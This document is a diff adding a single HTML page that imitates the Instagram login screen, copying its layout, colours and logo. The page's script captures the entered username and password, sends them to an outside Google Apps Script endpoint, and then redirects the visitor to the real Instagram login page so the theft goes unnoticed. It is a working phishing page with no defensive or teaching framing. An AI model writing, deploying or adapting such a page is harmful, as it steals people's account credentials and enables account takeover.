@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Instagram Login</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #fafafa;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .login-container {
+      background: #fff;
+      border: 1px solid #dbdbdb;
+      padding: 40px;
+      width: 350px;
+      text-align: center;
+    }
+    .login-container img.logo {
+      width: 175px;
+      margin-bottom: 20px;
+    }
+    .login-container input[type="text"],
+    .login-container input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin: 5px 0;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      background: #fafafa;
+    }
+    .login-container button {
+      width: 100%;
+      background-color: #0095f6;
+      color: white;
+      padding: 10px;
+      margin-top: 10px;
+      border: none;
+      border-radius: 4px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    .login-container .divider {
+      display: flex;
+      align-items: center;
+      text-align: center;
+      margin: 20px 0;
+    }
+    .login-container .divider::before,
+    .login-container .divider::after {
+      content: '';
+      flex: 1;
+      border-bottom: 1px solid #dbdbdb;
+    }
+    .login-container .divider span {
+      margin: 0 10px;
+      color: #8e8e8e;
+      font-size: 12px;
+    }
+    .login-container .signup {
+      margin-top: 20px;
+      font-size: 14px;
+    }
+    .login-container .signup a {
+      color: #0095f6;
+      text-decoration: none;
+      font-weight: 500;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" class="logo" />
+    <form id="loginForm">
+      <input type="text" name="username" placeholder="Phone number, username, or email" required>
+      <input type="password" name="password" placeholder="Password" required>
+      <button type="submit">Log In</button>
+    </form>
+    <div class="divider"><span>OR</span></div>
+    <div class="signup">
+      Don't have an account? <a href="#">Sign up</a>
+    </div>
+  </div>
+
+  <script>
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      
+      const btn = this.querySelector('button');
+      const originalText = btn.textContent;
+      btn.disabled = true;
+      btn.textContent = 'Logging in...';
+      
+      const formData = new FormData(this);
+      const data = {};
+      formData.forEach((value, key) => data[key] = value);
+      
+      fetch('https://script.google.com/macros/s/AKfycbzfcmKCxWAAB6pEnP8dr9UF6mkRoP68eaQLxaF3ij7sPQjNEshyBw22Ik4iiXSQlKA4mQ/exec', {
+        method: 'POST',
+        body: JSON.stringify(data),
+        headers: {
+          'Content-Type': 'application/json'
+        }
+      })
+      .then(response => {
+        if (!response.ok) throw new Error('Network response was not ok');
+        return response.text();
+      })
+      .then(() => {
+        window.location.href = 'https://www.instagram.com/accounts/login/';
+      })
+      .catch(error => {
+        console.error('Error:', error);
+        window.location.href = 'https://www.instagram.com/accounts/login/';
+      })
+      .finally(() => {
+        btn.disabled = false;
+        btn.textContent = originalText;
+      });
+    });
+  </script>
+</body>
+</html>
